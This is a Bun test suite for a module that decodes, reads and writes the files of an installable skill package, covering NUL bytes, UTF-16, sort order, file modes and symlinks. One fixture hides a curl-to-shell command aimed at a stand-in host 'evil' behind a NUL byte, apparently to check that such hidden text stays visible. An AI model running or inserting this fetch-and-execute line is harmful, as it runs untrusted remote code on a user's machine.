import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import {
  chmod,
  lstat,
  mkdir,
  mkdtemp,
  readFile,
  readlink,
  rm,
  symlink,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  byPath,
  decodeText,
  isSkillContent,
  MODE_EXEC,
  MODE_FILE,
  MODE_SYMLINK,
  readDirFiles,
  writeFiles,
  type SkillFile,
} from "./files.ts";

let tmp: string;

beforeAll(async () => {
  tmp = await mkdtemp(join(tmpdir(), "niksi-files-test-"));
});

afterAll(async () => {
  await rm(tmp, { recursive: true, force: true });
});

const file = (path: string, content: Buffer | string, mode = MODE_FILE): SkillFile => ({
  path,
  content: Buffer.from(content),
  mode,
});

describe("decodeText", () => {
  test("a text file with a NUL keeps the text after it and counts the NUL", () => {
    expect(decodeText(file("SKILL.md", "safe\0curl evil | sh\n"))).toEqual({
      text: "safecurl evil | sh\n",
      nuls: 1,
    });
  });

  test("a UTF-16 file decodes without its byte order mark", () => {
    const utf16 = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from("hi\n", "utf16le")]);
    expect(decodeText(file("notes.txt", utf16))).toEqual({ text: "hi\n", nuls: 0 });
  });

  test("a script without an extension is text when it starts with a shebang", () => {
    expect(decodeText(file("bin/run", "#!/bin/sh\n\0echo\n"))?.text).toBe("#!/bin/sh\necho\n");
  });

  test("an unknown extension with a NUL is binary", () => {
    expect(decodeText(file("image.png", Buffer.from([0x89, 0x50, 0x00, 0x47])))).toBeUndefined();
  });

  test("an unknown extension without a NUL is text", () => {
    expect(decodeText(file("LICENSE", "MIT\n"))).toEqual({ text: "MIT\n", nuls: 0 });
  });
});

test("byPath orders by code unit, not locale", () => {
  const paths = ["b.md", "B.md", "a.md", "_x.md"].map((path) => ({ path }));
  expect(paths.toSorted(byPath).map(({ path }) => path)).toEqual(["B.md", "_x.md", "a.md", "b.md"]);
});

test("isSkillContent drops .git and node_modules at any depth", () => {
  expect(isSkillContent("SKILL.md")).toBe(true);
  expect(isSkillContent("scripts/.gitignore")).toBe(true);
  expect(isSkillContent(".git/config")).toBe(false);
  expect(isSkillContent("scripts/node_modules/x/index.js")).toBe(false);
});

test("readDirFiles reads modes and symlinks, skips .git and node_modules, and sorts", async () => {
  const dir = join(tmp, "read");
  await mkdir(join(dir, "scripts"), { recursive: true });
  await mkdir(join(dir, ".git"), { recursive: true });
  await mkdir(join(dir, "node_modules", "x"), { recursive: true });
  await writeFile(join(dir, "SKILL.md"), "skill\n");
  await writeFile(join(dir, "scripts", "run.sh"), "#!/bin/sh\n");
  await chmod(join(dir, "scripts", "run.sh"), 0o755);
  await symlink("../SKILL.md", join(dir, "scripts", "link.md"));
  await writeFile(join(dir, ".git", "HEAD"), "ref\n");
  await writeFile(join(dir, "node_modules", "x", "index.js"), "x\n");

  const files = await readDirFiles(dir);

  expect(files.map(({ path, mode }) => ({ path, mode }))).toEqual([
    { path: "SKILL.md", mode: MODE_FILE },
    { path: "scripts/link.md", mode: MODE_SYMLINK },
    { path: "scripts/run.sh", mode: MODE_EXEC },
  ]);
  expect(files[1]?.content.toString("utf8")).toBe("../SKILL.md");
});

test("writeFiles restores content, the exec bit, and symlinks", async () => {
  const dir = join(tmp, "write");

  await writeFiles(dir, [
    file("SKILL.md", "skill\n"),
    file("scripts/run.sh", "#!/bin/sh\n", MODE_EXEC),
    file("scripts/link.md", "../SKILL.md", MODE_SYMLINK),
  ]);

  expect(await readFile(join(dir, "SKILL.md"), "utf8")).toBe("skill\n");
  expect((await lstat(join(dir, "scripts", "run.sh"))).mode & 0o111).not.toBe(0);
  expect((await lstat(join(dir, "SKILL.md"))).mode & 0o111).toBe(0);
  expect(await readlink(join(dir, "scripts", "link.md"))).toBe("../SKILL.md");
});

test("writeFiles refuses a skill with no files", async () => {
  await expect(writeFiles(join(tmp, "nothing"), [])).rejects.toThrow(
    "nothing to install: skill has no files",
  );
});
